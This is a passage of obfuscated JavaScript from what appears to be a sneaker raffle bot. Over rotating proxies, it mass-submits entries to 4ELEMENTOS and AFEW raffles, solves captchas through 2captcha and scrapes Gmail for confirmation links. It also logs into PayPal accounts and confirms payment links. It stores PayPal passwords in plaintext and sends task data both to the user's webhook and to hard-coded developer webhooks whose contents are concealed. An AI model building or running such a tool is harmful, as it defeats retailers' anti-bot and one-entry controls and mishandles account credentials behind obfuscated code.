        return _0x132f13['Password'] = _0x33dd83['Password'], _0x343ecd['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x132f13['Email'] + ',' + _0x132f13['Password'] + ',' + _0x132f13['Proxy']), _0x132f13;
    }
    let _0x230421 = await _0x83f22b();
    var _0x28f23e = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x330bb3 = await _0x1c1d23['get']('Amount'), _0x54593b = _0x330bb3['Amount'];
    async function _0x2fcdcd() {
        let _0x4aed90 = 0x0;
        var _0x1e64cf = new _0x5a0913({
            'user': _0x343742['masterMail'],
            'password': _0x343742['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x3f7829(_0x204da0) {
            _0x1e64cf['openBox']('INBOX', ![], _0x204da0);
        }
        _0x1e64cf['once']('ready', function () {
            _0x3f7829(function (_0x4417da, _0x5e074f) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x4417da)
                    throw _0x4417da;
                _0x1e64cf['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x470b05, _0x681ddf) {
                    if (!_0x681ddf || !_0x681ddf['length'])
                        console['log'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20No\x20mails\x20found'), _0x1e64cf['end']();
                    else {
                        _0x681ddf = _0x681ddf['slice'](0x0, _0x54593b);
                        var _0x5e7437 = _0x1e64cf['seq']['fetch'](_0x681ddf, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x5e7437['on']('message', function (_0x9418e9, _0x2d8942) {
                            var _0x3bb7ee = '(#' + _0x2d8942 + ')\x20';
                            _0x9418e9['on']('body', function (_0x5561d8, _0x201655) {
                                _0x57117f(_0x5561d8, (_0x1dd23e, _0x3b04ae) => {
                                    if (_0x3b04ae['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x3b04ae['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x3b04ae['text']['split']('[')[0x2];
                                        var _0x3dc853 = mes['split'](']')[0x0];
                                        _0x28f23e['push'](_0x3dc853);
                                    }
                                });
                            }), _0x9418e9['once']('end', function () {
                                _0x4aed90++;
                            });
                        }), _0x5e7437['once']('error', function (_0x449c2c) {
                            console['log']('Fetch\x20error:\x20' + _0x449c2c);
                        }), _0x5e7437['once']('end', function () {
                            _0x1e64cf['end']();
                        });
                    }
                });
            });
        }), _0x1e64cf['once']('error', function (_0x3a0c9d) {
            console['log'](_0x3f1ec6['red'](_0x3a0c9d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x1e64cf['once']('end', async function () {
        }), _0x1e64cf['connect']();
    }
    try {
        _0x2fcdcd(), await _0x4aaa24(0xfa0), console['log']('Found\x20' + _0x28f23e['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4aaa24(0xfa0);
    }
    var _0x22852a;
    _0x5c2a2f('' + _0x3e5d4c);
    var _0x12a55c = _0x230421['Proxy']['split'](':'), _0x3bc316;
    try {
        _0x3bc316 = await _0x154b82['launch']({
            'userDataDir': 'sessions/' + _0x230421['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x12a55c[0x0] + ':' + _0x12a55c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x3bc316 = await _0x154b82['launch']({
            'userDataDir': 'sessions/' + _0x230421['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x12a55c[0x0] + ':' + _0x12a55c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20Getting\x20Session');
        const _0xdc39b1 = await _0x3bc316['newPage']();
        await _0xdc39b1['authenticate']({
            'username': '' + _0x12a55c[0x2],
            'password': '' + _0x12a55c[0x3]
        }), await _0xdc39b1['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0xdc39b1['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0xdc39b1['waitForSelector']('#email');
            let _0x4969a1 = await _0xdc39b1['$eval']('#email', _0x3cbf91 => _0x3cbf91['getAttribute']('value'));
            if (_0x4969a1 == '') {
                await _0xdc39b1['type']('#email', _0x230421['Email']), await _0x4aaa24(0x1d3);
                let _0x49bbb7 = await _0xdc39b1['$']('#splitPassword');
                _0x49bbb7 && (await _0xdc39b1['click']('#btnNext'), await _0x4aaa24(0xa28)), await _0xdc39b1['type']('#password', _0x230421['Password']), await _0x4aaa24(0x35c), await _0xdc39b1['click']('#btnLogin');
            } else
                await _0xdc39b1['type']('#password', _0x230421['Password']), await _0x4aaa24(0x35c), await _0xdc39b1['click']('#btnLogin');
            await _0xdc39b1['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20Successfully\x20logged\x20in'), await _0x4aaa24(0x2710);
        } catch (_0x55ed6b) {
            throw new Error('Login\x20session\x20expired\x20' + _0x55ed6b);
        }
        for (var _0x28f40e = 0x0; _0x28f40e < _0x28f23e['length']; _0x28f40e++) {
            console['log'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20Task\x20' + (_0x28f40e + 0x1) + '\x20:\x20Starting\x20Verification'), _0x5c2a2f(_0x3e5d4c + '\x20Task\x20' + (_0x28f40e + 0x1) + '\x20/\x20' + _0x28f23e['length']);
            const _0x496688 = await _0x3bc316['newPage']();
            await _0x496688['goto']('' + _0x28f23e[_0x28f40e], { 'waitUntil': 'networkidle2' }), await _0x4aaa24(0xbb8);
            try {
                const _0x6d1260 = await _0x496688['$']('#challenge-heading');
                _0x6d1260 && (console['log'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20Task\x20' + (_0x28f40e + 0x1) + '\x20:\x20' + _0x3f1ec6['yellow']('2FA\x20Required')), await _0x496688['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4aaa24(0x9c40), await _0x496688['waitForSelector']('#payment-submit-btn'), await _0x496688['$eval']('#payment-submit-btn', _0x418a00 => _0x418a00['click']()), await _0x496688['click']('#payment-submit-btn');
                try {
                    await _0x496688['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4aaa24(0x5dc), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20Task\x20' + (_0x28f40e + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x418119) {
                    _0x4abdb3 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x418119['message']);
                } finally {
                    if (_0x4abdb3 == 'yes' && _0x434e2c != 0x2) {
                        console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x3e5d4c['name'] + ']\x20Task\x20' + (_0x28f40e + 0x1) + '\x20:\x20Retrying\x20(' + _0x434e2c + '\x20/\x205)')), _0x28f40e = _0x28f40e - 0x1, _0x434e2c = _0x434e2c + 0x1;
                        continue;
                    }
                    _0x4abdb3 == 'yes' && _0x434e2c >= 0x2 && (_0x5d0cd0(csv[_0x28f40e], _0x3e5d4c), _0x4abdb3 = 'no', _0x434e2c = 0x0), await _0x496688['close'](), await _0x4aaa24(0x4650);
                }
            } catch (_0x26d1ab) {
                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x3e5d4c + ']\x20Task\x20' + (_0x28f40e + 0x1) + '\x20:\x20' + _0x26d1ab));
            }
        }
    } catch (_0x526e95) {
        console['log'](_0x3f1ec6['red']('' + _0x526e95));
    } finally {
        await _0x3bc316['close']();
    }
}
const _0x34ba82 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x2f98f2, _0x1304c5, _0x49712b) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5a3f73 = 0x0; _0x5a3f73 < _0x1304c5['length']; _0x5a3f73++) {
                        if (_0x419acf != 'yes')
                            var _0x419acf = '', _0x533270 = 0x0;
                        var _0xf566be;
                        try {
                            await _0x10409e(_0x1304c5, _0x5a3f73);
                        } catch {
                            _0x419acf = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5c2a2f(_0x2f98f2['name'] + '\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20/\x20' + _0x1304c5['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        var _0x1e8498 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x542fad = Math['round'](Math['random']() * (_0x1e8498['length'] - 0x1));
                        _0x1304c5[_0x5a3f73]['Size'] == 'RANDOM' && (_0x1304c5[_0x5a3f73]['Size'] = _0x1e8498[_0x542fad]);
                        var _0x13a6e8 = Math['round'](Math['random']() * (_0x49712b['length'] - 0x1)), _0x7a14c8 = _0x49712b[_0x13a6e8]['split'](':'), _0x1fe557;
                        try {
                            _0x1fe557 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x7a14c8[0x0] + ':' + _0x7a14c8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1fe557 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x7a14c8[0x0] + ':' + _0x7a14c8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x10727e = await _0x1fe557['newPage']();
                            await _0x10727e['authenticate']({
                                'username': '' + _0x7a14c8[0x2],
                                'password': '' + _0x7a14c8[0x3]
                            }), await _0x10727e['setRequestInterception'](!![]), _0x10727e['on']('request', _0x4d2b38 => {
                                _0x4d2b38['resourceType']() === 'image' || _0x4d2b38['resourceType']() === 'font' || _0x4d2b38['resourceType']() === 'media' ? _0x4d2b38['abort']() : _0x4d2b38['continue']();
                            }), await _0x10727e['goto'](_0x1304c5[_0x5a3f73]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x10727e['waitForSelector']('#accept-all-gdpr'), await _0x10727e['click']('#accept-all-gdpr'), await _0x10727e['waitForSelector']('#raffles-product'), await _0x4aaa24(0x3e8), await _0x10727e['$eval']('#raffles-product', _0x1dd1e7 => _0x1dd1e7['click']()), await _0x4aaa24(0x1388), await _0x10727e['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1b4fb4 = await _0x10727e['$']('.fancybox-inner\x20>\x20iframe'), _0x477f63 = await _0x1b4fb4['contentFrame']();
                            console['log'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x477f63['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x4aaa24(0x1f4), await _0x477f63['type']('input[name=\x22sm-form-email\x22]', _0x1304c5[_0x5a3f73]['Email']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-form-name\x22]', _0x1304c5[_0x5a3f73]['FirstName'] + '\x20' + _0x1304c5[_0x5a3f73]['LastName']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-form-street\x22]', _0x1304c5[_0x5a3f73]['Address1'] + '\x20' + _0x1304c5[_0x5a3f73]['HouseNumber'] + '\x20' + _0x1304c5[_0x5a3f73]['Address2']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-form-city\x22]', _0x1304c5[_0x5a3f73]['City']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-form-province\x22]', _0x1304c5[_0x5a3f73]['State']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-form-zip\x22]', _0x1304c5[_0x5a3f73]['Zip']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-form-country\x22]', _0x1304c5[_0x5a3f73]['Country']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-form-phone\x22]', _0x1304c5[_0x5a3f73]['Phone']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x1304c5[_0x5a3f73]['Follower']), await _0x4aaa24(0xc8), await _0x477f63['type']('input[name=\x22sm-cst.size\x22]', _0x1304c5[_0x5a3f73]['Size']), await _0x4aaa24(0x1f4), await _0x477f63['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x4aaa24(0x1f4), await _0x477f63['click']('.icheckbox_simple-custom'), await _0x4aaa24(0x1f4), console['log'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x477f63['$eval']('form', _0x15321f => _0x15321f['submit']()), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x419acf = '';
                            var _0x2a6e2f = await _0xe75614(_0x1304c5[_0x5a3f73], _0x2f98f2, 'dev', ![]), _0x4c5321 = await _0xe75614(_0x1304c5[_0x5a3f73], _0x2f98f2, 'pub', ![]);
                            const _0x256ae1 = {
                                'succesDEVMSG': { 'embeds': [_0x2a6e2f] },
                                'succesPUBMSG': { 'embeds': [_0x4c5321] }
                            };
                            try {
                                _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x256ae1['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x256ae1['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x256ae1['succesPUBMSG']);
                            } catch (_0x72d1d6) {
                                console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x72d1d6));
                            }
                        } catch (_0x7e3f02) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20' + _0x7e3f02)), _0xf566be = '' + _0x7e3f02;
                            var _0x464050 = await _0xe75614(_0x1304c5[_0x5a3f73], _0x2f98f2, 'dev', !![], _0xf566be), _0x2a6e2f = await _0xe75614(_0x1304c5[_0x5a3f73], _0x2f98f2, 'dev', ![]), _0x4c5321 = await _0xe75614(_0x1304c5[_0x5a3f73], _0x2f98f2, 'pub', ![]);
                            const _0x5c1242 = {
                                'succesDEVMSG': { 'embeds': [_0x2a6e2f] },
                                'succesPUBMSG': { 'embeds': [_0x4c5321] }
                            };
                            _0x5c1242['errorDEV'] = { 'embeds': [_0x464050] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x5c1242['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x5c1242['errorDEV']), _0x7e3f02 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x419acf = 'yes');
                        } finally {
                            _0x1fe557['close']();
                            if (_0x419acf == 'yes' && _0x533270 != 0x5 && _0xf566be != 'Size\x20Not\x20Found') {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Task\x20' + (_0x5a3f73 + 0x1) + '\x20:\x20Retrying\x20(' + _0x533270 + '\x20/\x205)\x20')), _0x5a3f73 = _0x5a3f73 - 0x1, _0x533270 = _0x533270 + 0x1;
                                continue;
                            }
                            _0x419acf == 'yes' && _0x533270 >= 0x5 && (_0x5d0cd0(_0x1304c5[_0x5a3f73], _0x2f98f2), _0x419acf = 'no', _0x533270 = 0x0), console['log'](_0x15e32e() + '\x20[' + _0x2f98f2['name'] + ']\x20Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0xc9cd1e, _0x26ef86) {
                    var _0x44e0af = [];
                    async function _0x21e632() {
                        var _0x209c28 = new _0x5a0913({
                            'user': _0x343742['masterMail'],
                            'password': _0x343742['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5a6868(_0x43be6a) {
                            _0x209c28['openBox']('INBOX', ![], _0x43be6a);
                        }
                        _0x209c28['once']('ready', function () {
                            _0x5a6868(function (_0x11bf8c, _0x5e7ffd) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x11bf8c)
                                    throw _0x11bf8c;
                                _0x209c28['seq']['search'](['UNSEEN'], function (_0x1d81a1, _0x48f398) {
                                    if (!_0x48f398 || !_0x48f398['length'])
                                        console['log'](_0x15e32e() + '\x20[' + _0xc9cd1e['name'] + ']\x20No\x20mails\x20found'), _0x209c28['end']();
                                    else {
                                        var _0x48de2e = _0x209c28['seq']['fetch'](_0x48f398, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x48de2e['on']('message', function (_0xf07132, _0x171906) {
                                            var _0xd9a79c = '(#' + _0x171906 + ')\x20';
                                            _0xf07132['on']('body', function (_0x346f92, _0x22dd3d) {
                                                _0x57117f(_0x346f92, (_0x1a32d9, _0x3291de) => {
                                                    if (_0x3291de['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x588722 = _0x3291de['html']['split']('\x0a');
                                                        for (var _0x349951 = 0x0; _0x349951 < _0x588722['length']; _0x349951++) {
                                                            if (_0x588722[_0x349951]['includes']('salesmanago') && _0x588722[_0x349951]['includes']('<td') && _0x588722[_0x349951]['includes']('href')) {
                                                                var _0x46b209 = _0x588722[_0x349951]['split']('href=\x22'), _0x27d73d = _0x46b209[0x1]['split']('\x22')[0x0];
                                                                _0x44e0af['push'](_0x27d73d);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0xf07132['once']('end', function () {
                                            });
                                        }), _0x48de2e['once']('error', function (_0x35a716) {
                                            console['log']('Fetch\x20error:\x20' + _0x35a716);
                                        }), _0x48de2e['once']('end', function () {
                                            _0x209c28['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x209c28['once']('error', function (_0x23e299) {
                            console['log'](_0x3f1ec6['red'](_0x23e299['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x209c28['once']('end', async function () {
                        }), _0x209c28['connect']();
                    }
                    async function _0x341d9c(_0x16d8ba, _0x1daeff, _0x1fb981) {
                        for (var _0x14b3f2 = 0x0; _0x14b3f2 < _0x1daeff['length']; _0x14b3f2++) {
                            async function _0x2c7655(_0x4d579d, _0x181adb, _0x2e4fe0, _0x490ff8, _0x2ce236) {
                                var _0x58bd3a, _0x2eb09d = {}, _0x1941b9 = [], _0x1ee4cf = {}, _0x516fb0 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3b9bb7 = Math['round'](Math['random']() * (_0x516fb0['length'] - 0x1));
                                _0x490ff8[_0x4d579d]['Size'] == 'RANDOM' && (_0x490ff8[_0x4d579d]['Size'] = _0x516fb0[_0x3b9bb7]);
                                !_0x490ff8 && (_0x490ff8 = {});
                                if (_0x343742['useRandomProxy'] = ![])
                                    var _0x14741e = _0x2ce236[_0x4d579d]['split'](':');
                                else
                                    var _0x584bb8 = Math['round'](Math['random']() * (_0x2ce236['length'] - 0x1)), _0x14741e = _0x2ce236[_0x584bb8]['split'](':');
                                var _0x57bec6 = {
                                    'jar': _0x30822e,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2e4fe0['url'],
                                    'headers': _0x2e4fe0['headers'],
                                    'body': JSON['stringify'](_0x2eb09d),
                                    'proxy': 'http://' + _0x14741e[0x2] + ':' + _0x14741e[0x3] + '@' + _0x14741e[0x0] + ':' + _0x14741e[0x1]
                                };
                                return _0x181adb != 'ver' && (_0x57bec6['url'] = _0x2e4fe0['url'], _0x57bec6['headers'] = _0x2e4fe0['headers']), _0x181adb == 'ver' && (_0x57bec6['method'] = 'GET', _0x57bec6['url'] = _0x490ff8[_0x4d579d]), new Promise(function (_0x1a1f7e, _0x36fded) {
                                    callback = async (_0x4ae248, _0x4ed1bd, _0x1df3aa) => {
                                        if (!_0x4ae248 && _0x4ed1bd['statusCode'] == 0xca || !_0x4ae248 && _0x4ed1bd['statusCode'] == 0xc8) {
                                            if (_0x181adb != 'ver') {
                                                var _0x3d36f4 = await _0xe75614(_0x490ff8[_0x4d579d], _0x2e4fe0, 'dev', ![]), _0x280190 = await _0xe75614(_0x490ff8[_0x4d579d], _0x2e4fe0, 'pub', ![]);
                                                const _0x23be5a = {
                                                    'succesDEVMSG': { 'embeds': [_0x3d36f4] },
                                                    'succesPUBMSG': { 'embeds': [_0x280190] }
                                                };
                                                if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                                                    try {
                                                        await _0x3c4b04(_0x343742['webhook'], _0x23be5a['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x23be5a['succesDEVMSG']), await _0x4aaa24(0xc8);
                                                try {
                                                    await _0x3c4b04(_0x510dd4, _0x23be5a['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3265a5(_0x490ff8[_0x4d579d], _0x2e4fe0);
                                            }
                                            _0x1a1f7e(console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x2e4fe0['name'] + ']\x20Task\x20' + (_0x4d579d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x181adb != 'ver') {
                                                var _0x215b32 = '' + _0x4ae248, _0x5b3c1b = await _0xe75614(_0x490ff8[_0x4d579d], _0x2e4fe0, 'dev', !![], _0x215b32), _0x424817 = {};
                                                _0x424817['errorDEV'] = { 'embeds': [_0x5b3c1b] }, _0x5d0cd0(_0x490ff8[_0x4d579d], _0x2e4fe0), _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x424817['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x424817['errorDEV']);
                                            }
                                            _0x36fded(console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x2e4fe0['name'] + ']\x20Task\x20' + (_0x4d579d + 0x1) + ':\x20' + _0x4ae248)));
                                        }
                                    };
                                    try {
                                        _0x181adb != 'ver' ? console['log'](_0x15e32e() + '\x20[' + _0x2e4fe0['name'] + ']\x20Task\x20' + (_0x4d579d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2eb09d['data']['attributes']['email']) : console['log'](_0x15e32e() + '\x20[' + _0x2e4fe0['name'] + ']\x20Task\x20' + (_0x4d579d + 0x1) + ':\x20Fetching\x20Response'), _0x954c28(_0x57bec6, callback);
                                    } catch (_0x149822) {
                                        console['log'](_0x15e32e() + '\x20Task\x20' + (_0x4d579d + 0x1) + ':\x20' + _0x149822);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2c7655(_0x14b3f2, 'ver', _0x16d8ba, _0x1daeff, _0x1fb981), console['log'](_0x15e32e() + '\x20[' + _0x16d8ba['name'] + ']\x20Sleeping\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                            } catch (_0x283512) {
                            }
                        }
                    }
                    try {
                        _0x21e632(), await _0x4aaa24(0xfa0), console['log']('Found\x20' + _0x44e0af['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x341d9c(_0xc9cd1e, _0x44e0af, _0x26ef86);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x2f3ca7, _0x37e083, _0xc81b88) {
                for (var _0x23bd43 = 0x0; _0x23bd43 < _0x37e083['length']; _0x23bd43++) {
                    _0x343742['AfewDelay'] = _0x343742['delay'];
                    var _0x8318ed;
                    if (_0x189094 != 'yes')
                        var _0x189094 = '', _0x48181a = 0x0;
                    var _0x4d537b = _0x37e083[_0x23bd43]['Url'], _0xbff910 = _0x37e083[_0x23bd43];
                    _0x5c2a2f(_0x2f3ca7['name'] + '\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20/\x20' + _0x37e083['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                    try {
                        await _0x10409e(_0x37e083, _0x23bd43);
                    } catch {
                        _0x189094 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xa23eb9(_0x46db38) {
                        const _0x2c85db = _0x343ecd['readFileSync']('../successful-tasks.csv', 'utf8'), _0x19aa85 = _0x54b359['parse'](_0x2c85db, { 'header': !![] })['data'];
                        let _0x4d8476 = ![];
                        for (var _0x89b833 of _0x19aa85) {
                            if (_0x89b833['Url'] == _0x46db38['Url'] && _0x89b833['Email'] == _0x46db38['Email']) {
                                _0x4d8476 = !![];
                                break;
                            }
                        }
                        return _0x4d8476;
                    }
                    if (await _0xa23eb9(_0x37e083[_0x23bd43]) == !![]) {
                        console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x1d9e5d = await _0xe75614(_0x37e083[_0x23bd43], _0x2f3ca7, 'dev', ![]), _0xca8495 = await _0xe75614(_0x37e083[_0x23bd43], _0x2f3ca7, 'pub', ![]);
                    const _0x2b69a8 = {
                        'succesDEVMSG': { 'embeds': [_0x1d9e5d] },
                        'succesPUBMSG': { 'embeds': [_0xca8495] }
                    };
                    if (_0x37e083[_0x23bd43]['Email'] == '' || _0x37e083[_0x23bd43]['FirstName'] == '' || _0x37e083[_0x23bd43]['LastName'] == '' || _0x37e083[_0x23bd43]['Country'] == '' || _0x37e083[_0x23bd43]['Size'] == '' || _0x37e083[_0x23bd43]['Address1'] == '' || _0x37e083[_0x23bd43]['Zip'] == '') {
                        console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x343742['useRandomProxy'] = ![])
                        var _0x4da815 = _0xc81b88[_0x23bd43]['split'](':');
                    else
                        var _0x5d7054 = Math['round'](Math['random']() * (_0xc81b88['length'] - 0x1)), _0x4da815 = _0xc81b88[_0x5d7054]['split'](':');
                    var _0x4cc49b;
                    try {
                        _0x4cc49b = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4da815[0x0] + ':' + _0x4da815[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4cc49b = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
